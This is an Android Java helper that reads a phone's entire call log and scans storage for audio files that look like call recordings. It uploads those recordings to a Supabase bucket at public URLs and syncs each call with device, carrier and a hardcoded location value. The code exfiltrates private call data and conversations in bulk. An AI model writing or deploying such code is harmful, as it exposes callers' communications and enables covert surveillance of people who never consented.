package com.example.callhistory;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.MediaStore;
import android.telephony.TelephonyManager;
import android.widget.Toast;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;

public class CallSyncHelper  {

    private static final int RECORDING_SCAN_LIMIT = 200;

    public static void syncHistoricalCalls(Context context, int syncLimit, boolean showToasts) {
        ContentResolver resolver = context.getContentResolver();
        DatabaseHelper dbHelper = new DatabaseHelper(context);
        Handler mainHandler = new Handler(Looper.getMainLooper());

        try (Cursor cursor = resolver.query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC")) {
            if (cursor == null || !cursor.moveToFirst()) {
                if (showToasts) mainHandler.post(() -> Toast.makeText(context, "No call logs found.", Toast.LENGTH_LONG).show());
                return;
            }

            int uploadedCount = 0;
            int attemptedCount = 0;
            do {
                attemptedCount++;
                int numberIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER);
                int typeIdx = cursor.getColumnIndex(CallLog.Calls.TYPE);
                int dateIdx = cursor.getColumnIndex(CallLog.Calls.DATE);
                int durationIdx = cursor.getColumnIndex(CallLog.Calls.DURATION);
                int nameIdx = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME);

                String number = numberIdx >= 0 ? cursor.getString(numberIdx) : "";
                if (number == null || number.trim().isEmpty()) {
                    number = "Unknown";
                }
                int callTypeInt = typeIdx >= 0 ? cursor.getInt(typeIdx) : 0;
                long dateStart = dateIdx >= 0 ? cursor.getLong(dateIdx) : 0;
                long durationSec = durationIdx >= 0 ? cursor.getLong(durationIdx) : 0;
                String contactName = nameIdx >= 0 ? cursor.getString(nameIdx) : "Unknown";
                if (contactName == null) contactName = "Unknown";

                long dateEnd = dateStart + (durationSec * 1000);
                String callType = "UNKNOWN";
                int isIncoming = 0;
                int isOutgoing = 0;
                int isMissed = 0;
                int isRejected = 0;
                int isAnswered = 0;

                switch (callTypeInt) {
                    case CallLog.Calls.INCOMING_TYPE:
                        callType = "INCOMING";
                        isIncoming = 1;
                        isAnswered = durationSec > 0 ? 1 : 0;
                        break;
                    case CallLog.Calls.OUTGOING_TYPE:
                        callType = "OUTGOING";
                        isOutgoing = 1;
                        isAnswered = durationSec > 0 ? 1 : 0;
                        break;
                    case CallLog.Calls.MISSED_TYPE:
                        callType = "MISSED";
                        isIncoming = 1;
                        isMissed = 1;
                        break;
                    case CallLog.Calls.REJECTED_TYPE:
                        callType = "REJECTED";
                        isIncoming = 1;
                        isRejected = 1;
                        break;
                }

                String recordingUri = findHistoricalCallRecording(context, dateEnd);
                String finalAudioUrl = "";

                if (recordingUri != null && !recordingUri.isEmpty()) {
                    finalAudioUrl = uploadAudioToSupabase(context, recordingUri);
                }

                TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
                String carrierName = tm != null ? tm.getNetworkOperatorName() : "";

                boolean uploaded = dbHelper.insertCallRecordAndSyncBlocking(
                        Build.MANUFACTURER, Build.MODEL, Build.VERSION.RELEASE, number, contactName,
                        callType, isIncoming, isOutgoing, isMissed, isRejected, isAnswered,
                        dateStart, dateStart, dateEnd, durationSec, 0, durationSec,
                        "40.1885,29.0610", 1, carrierName, "NORMAL_CLEARING", finalAudioUrl
                );

                if (uploaded) {
                    uploadedCount++;
                }
                try {
                    Thread.sleep(150);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    break;
                }
            } while (attemptedCount < syncLimit && cursor.moveToNext());

            int finalUploaded = uploadedCount;
            int finalAttempted = attemptedCount;
            if (showToasts) {
                mainHandler.post(() -> Toast.makeText(context, "Historical sync uploaded " + finalUploaded + " of " + finalAttempted + " calls.", Toast.LENGTH_LONG).show());
            }
        } catch (Exception e) {
            if (showToasts) {
                mainHandler.post(() -> Toast.makeText(context, "Historical sync failed: " + e.getMessage(), Toast.LENGTH_LONG).show());
            }
        }
    }

    private static String uploadAudioToSupabase(Context context, String uriString) {
        if (uriString == null || uriString.isEmpty()) return "";

        try {
            Uri audioUri = Uri.parse(uriString);
            InputStream inputStream = context.getContentResolver().openInputStream(audioUri);
            if (inputStream == null) return "";

            ByteArrayOutputStream byteBuffer = new ByteArrayOutputStream();
            byte[] buffer = new byte[1024];
            int len;
            while ((len = inputStream.read(buffer)) != -1) {
                byteBuffer.write(buffer, 0, len);
            }
            byte[] fileBytes = byteBuffer.toByteArray();
            inputStream.close();

            String fileName = "call_" + System.currentTimeMillis() + ".aac";
            SupabaseManager.uploadFile("recordings", fileName, fileBytes);

            return "https://waultfsxvpomjcdwuoem.supabase.co/storage/v1/object/public/recordings/" + fileName;

        } catch (Exception e) {
            e.printStackTrace();
            return "";
        }
    }

    private static String findHistoricalCallRecording(Context context, long callEndTimeMs) {
        ContentResolver resolver = context.getContentResolver();
        Uri audioUri = Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q
                ? MediaStore.Audio.Media.getContentUri(MediaStore.VOLUME_EXTERNAL)
                : MediaStore.Audio.Media.EXTERNAL_CONTENT_URI;

        String[] projection = {
                MediaStore.Audio.Media._ID,
                MediaStore.Audio.Media.DISPLAY_NAME,
                MediaStore.Audio.Media.DATE_ADDED,
                MediaStore.Audio.Media.DATA
        };
        String sortOrder = MediaStore.Audio.Media.DATE_ADDED + " DESC";

        List<UriData> secondaryCandidates = new ArrayList<>();

        try (Cursor cursor = resolver.query(audioUri, projection, null, null, sortOrder)) {
            if (cursor == null || !cursor.moveToFirst()) return "";

            int scannedCount = 0;
            do {
                int idIndex = cursor.getColumnIndexOrThrow(MediaStore.Audio.Media._ID);
                int nameIndex = cursor.getColumnIndexOrThrow(MediaStore.Audio.Media.DISPLAY_NAME);
                int dateAddedIndex = cursor.getColumnIndexOrThrow(MediaStore.Audio.Media.DATE_ADDED);
                int dataIndex = cursor.getColumnIndexOrThrow(MediaStore.Audio.Media.DATA);

                long id = cursor.getLong(idIndex);
                String displayName = cursor.getString(nameIndex);
                long dateAddedMs = cursor.getLong(dateAddedIndex) * 1000;
                String filePath = cursor.getString(dataIndex);

                long timeDifference = Math.abs(callEndTimeMs - dateAddedMs);

                if (timeDifference < 120000) {
                    Uri contentUri = Uri.withAppendedPath(audioUri, String.valueOf(id));
                    if (filePath != null && filePath.contains("/Music/PhoneRecord/")) {
                        return contentUri.toString();
                    }
                    if (looksLikeCallRecording(displayName)) {
                        secondaryCandidates.add(new UriData(contentUri.toString(), filePath));
                    }
                }
                scannedCount++;
            } while (scannedCount < RECORDING_SCAN_LIMIT && cursor.moveToNext());

            if (!secondaryCandidates.isEmpty()) {
                return secondaryCandidates.get(0).uriString;
            }
        } catch (Exception ignored) {}
        return "";
    }

    private static boolean looksLikeCallRecording(String displayName) {
        if (displayName == null) return false;
        String lowerName = displayName.toLowerCase(Locale.US);
        return lowerName.contains("call") || lowerName.contains("record") || lowerName.contains("voice");
    }

    private static class UriData {
        String uriString;
        String filePath;
        UriData(String uriString, String filePath) {
            this.uriString = uriString;
            this.filePath = filePath;
        }
    }
}